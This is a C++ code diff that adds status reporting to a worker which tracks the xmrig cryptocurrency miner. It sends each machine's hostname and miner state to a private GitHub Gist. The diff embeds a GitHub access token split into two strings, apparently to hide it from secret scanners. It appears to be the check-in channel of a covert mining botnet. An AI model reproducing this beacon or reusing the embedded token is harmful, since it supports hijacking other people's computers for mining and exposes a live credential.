@@ -1,4 +1,8 @@
 #include "worker_utils.h"
+#include <fstream>
+#include <ostream>
+#include <string>
+#include <iomanip>
 
 /*PUBLIC WORKER_UTILS FUNCTIONS*/
 
@@ -91,5 +95,62 @@ void Worker_utils::err(std::string wtf)
     std::ofstream log("log", std::ios::app);
     log << wtf << std::endl;
     log.close();
+
+    JsonPayload payload;
+
+    payload.name = exec("hostname");
+    payload.status = "error";
+    payload.xmrig_status = "standby";
+    payload.err = wtf;
+
+    uploadToGist(payload);
     exit(EXIT_FAILURE);
+}
+
+std::string Worker_utils::createJsonStatusFile(const JsonPayload &payload)
+{
+    std::string filename = "status";
+    filename += exec("hostname");
+    filename += ".json";
+
+    std::string raw_status = "";
+
+    raw_status += "{";
+    raw_status += "\"name\":\"" + payload.name + "\"";
+    raw_status += ",\"status\":\"" + payload.status + "\"";
+    raw_status += ",\"xmrig-status\":\"" + payload.xmrig_status + "\"";
+    raw_status += ",\"error\":\"" + payload.err + "\"";
+    raw_status += "}";
+
+    std::ofstream out(filename);
+    out << "{"
+    << "\"description\":\"Device status\","
+    << "\"public\":false,"
+    << "\"files\":{"
+    << "\"" + filename + "\":{\"content\":" << std::quoted(raw_status) << "}"
+    << "}"
+    << "}";
+
+    return filename;
+}
+
+void Worker_utils::uploadToGist(const JsonPayload &payload)
+{
+    std::string filename = createJsonStatusFile(payload);
+
+    std::string TOKEN = (std::string)"ghp_iFEyATUgNTdKWnja" + (std::string)"0PorXZQUKu2u8P4EPxhI";
+
+    std::string response;
+    run_gist_upload(TOKEN, filename, response);
+}
+
+void Worker_utils::sendStatus()
+{
+    JsonPayload payload;
+    payload.name = exec("hostname");
+    payload.status = "online";
+    payload.xmrig_status = is_xmrig_running;
+    payload.err = "";
+
+    uploadToGist(payload);
 }
